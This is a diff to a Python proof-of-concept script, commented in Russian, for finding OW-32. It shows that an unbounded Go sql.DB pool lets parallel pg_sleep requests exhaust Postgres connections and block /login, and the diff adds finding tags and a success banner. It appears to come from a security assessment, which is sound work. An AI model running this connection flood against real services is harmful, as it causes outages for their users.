@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-04 — исчерпание Postgres из-за неограниченного пула sql.DB.
+04 — исчерпание Postgres из-за неограниченного пула sql.DB (OW-32).
 
 У sql.DB не вызван SetMaxOpenConns (server.go:25), значит на каждый
 параллельный запрос приложение открывает своё соединение к Postgres.
@@ -57,12 +57,12 @@ def slow_query(i: int, results: dict) -> None:
         results[i] = str(e)
 
 
-print("== обычный запрос до атаки ==")
+print("== OW-32: обычный запрос до атаки ==")
 t = time.time()
 with urllib.request.urlopen(BASE + "/login", timeout=10) as r:
     print("GET /login -> %d за %.2fs" % (r.status, time.time() - t))
 
-print("\n== %d параллельных запросов с pg_sleep(%d) ==" % (PARALLEL, HOLD))
+print("\n== OW-32: %d параллельных запросов с pg_sleep(%d) ==" % (PARALLEL, HOLD))
 results: dict = {}
 threads = [
     threading.Thread(target=slow_query, args=(i, results))
@@ -74,7 +74,7 @@ for th in threads:
 
 # пока потоки держат соединения к БД, проверяем обычный запрос
 time.sleep(5)
-print("\n== обычный запрос во время удержания %d соединений с БД ==" % PARALLEL)
+print("\n== OW-32: обычный запрос во время удержания %d соединений с БД ==" % PARALLEL)
 t2 = time.time()
 try:
     with urllib.request.urlopen(BASE + "/login", timeout=15) as r:
@@ -91,6 +91,15 @@ errs = sum(1 for v in results.values() if v != 200)
 tm = sum(1 for v in results.values() if v == "500-too-many")
 print("ответов: %d, не-200: %d, из них 'too many clients': %d, заняло %.1fs"
       % (len(results), errs, tm, time.time() - t))
+print("┌─ АРТЕФАКТ · OW-32")
+print("│ concurrent requests: %d; non-200: %d; too-many-clients: %d" %
+      (len(results), errs, tm))
+print("│ обычный логин во время исчерпания соединений — см. измерение выше")
+print("└─")
+if errs:
+    print("\033[32m[+] неограниченный пул исчерпал max_connections=100: %d ответов не-200\033[0m" % errs)
+else:
+    print("\033[31m[-] исчерпание пула не подтвердилось: все ответы 200\033[0m")
 seen = set()
 for v in results.values():
     if v not in seen:
@@ -99,7 +108,7 @@ for v in results.values():
     if len(seen) >= 5:
         break
 
-print("\n== после завершения ==")
+print("\n== OW-32: после завершения ==")
 t = time.time()
 try:
     with urllib.request.urlopen(BASE + "/login", timeout=15) as r:
